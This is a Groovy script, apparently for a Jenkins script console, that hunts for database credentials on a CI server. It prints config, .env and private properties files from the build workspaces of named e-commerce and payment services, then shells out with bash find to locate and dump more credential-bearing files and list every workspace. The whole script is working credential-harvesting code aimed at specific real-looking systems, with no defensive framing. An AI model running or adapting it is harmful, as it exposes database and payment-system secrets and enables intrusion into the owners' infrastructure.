println "=== READING CONFIG FILES FOR DB CREDS ==="

def readFile(String path, int maxLen=3000) {
    try {
        def f = new File(path)
        if (!f.exists()) return "NOT_FOUND"
        def content = f.text
        return content.length() > maxLen ? content.substring(0, maxLen) + "...[TRUNCATED]" : content
    } catch (Exception e) {
        return "ERR: ${e.message}"
    }
}

def bashExec(String cmd, int timeout=8000) {
    try {
        def proc = ['bash', '-c', cmd].execute()
        def out = new StringBuilder()
        def err = new StringBuilder()
        proc.consumeProcessOutput(out, err)
        proc.waitForOrKill(timeout)
        return out.toString().trim()
    } catch (Exception e) {
        return "ERR: ${e.message}"
    }
}

// 1. Carrito Microservice DB configs
def base1 = "/var/jenkins_home/workspace/claroshop_build_carritoms.dev.claroshop.com"
println "\n--- CARRITO MS: common DB config ---"
println readFile("${base1}/common/config/main-local.php")
println readFile("${base1}/common/config/main.php")
println readFile("${base1}/common/config/params-local.php")
println readFile("${base1}/common/config/params.php")

println "\n--- CARRITO MS: .env / environments ---"
println readFile("${base1}/.env")
println readFile("${base1}/environments/dev/common/config/main-local.php")
println readFile("${base1}/environments/prod/common/config/main-local.php")

println "\n--- CARRITO MS: codeception.yml ---"
println readFile("${base1}/codeception.yml")

// 2. Caja Pagos API configs
def base2 = "/var/jenkins_home/workspace/cs_msa_front/cs_msa_build_caja-pagos-api-deploy2dev"
println "\n--- CAJA PAGOS: config files ---"
println readFile("${base2}/config/autoload/local.php")
println readFile("${base2}/config/autoload/global.php")
println readFile("${base2}/config/autoload/doctrine.local.php")
println readFile("${base2}/config/autoload/database.local.php")

println "\n--- CAJA PAGOS: cache.properties ---"
println readFile("${base2}/cache.properties")

println "\n--- CAJA PAGOS: nbproject config ---"
println readFile("${base2}/nbproject/private/private.properties")

// 3. Find more config files with DB creds
println "\n--- ADDITIONAL PHP CONFIGS ---"
def configs = bashExec("find /var/jenkins_home/workspace/ -maxdepth 5 \\( -name 'main-local.php' -o -name 'local.php' -o -name 'database.php' -o -name 'db.php' -o -name 'params-local.php' -o -name '.env' -o -name 'app.ini' -o -name 'doctrine.local.php' \\) 2>/dev/null")
println configs
configs.split('\n').findAll{it.trim()}.take(10).each { f ->
    println "\n=== ${f} ==="
    println readFile(f)
}

// 4. List all workspace directories
println "\n--- WORKSPACE DIRECTORIES ---"
println bashExec("ls -la /var/jenkins_home/workspace/ 2>/dev/null")

println "\n=== READ DONE ==="
